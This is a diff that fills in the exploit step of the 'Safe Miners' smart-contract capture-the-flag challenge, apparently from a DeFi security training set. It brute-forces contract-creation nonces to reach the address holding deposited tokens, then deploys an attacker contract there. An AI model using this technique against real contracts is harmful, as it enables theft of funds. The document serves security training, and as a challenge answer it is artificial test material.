@@ -24,6 +24,30 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // off chain search the target address by `create-create`
+        let found = false;
+        for (let nonce = 0; nonce < 100; nonce++) {
+            let tx = { from: attacker.address, nonce: ethers.BigNumber.from(nonce) };
+            const contractAddr = ethers.utils.getContractAddress(tx);
+
+            for (let nonce2 = 1; nonce2 < 100; nonce2++) {
+                tx = { from: contractAddr, nonce: ethers.BigNumber.from(nonce2) };
+                if(ethers.utils.getContractAddress(tx)==DEPOSIT_ADDRESS){
+                    // console.log('target found! nonce1:%d, nonce2:%d', nonce, nonce2);
+                    found = true;
+                    break;
+                }
+            }
+            if(found) break;
+        }
+        // nonce1:1, nonce2:66
+        // increase nonce by send value
+        await attacker.sendTransaction({value: ethers.BigNumber.from(1), to: ethers.constants.AddressZero});
+
+        const someContract = await (
+            await ethers.getContractFactory('SafeMinerAttacker', attacker)
+            ).deploy(this.token.address, 66);
+        await someContract.deployed();
     });
 
     after(async function () {
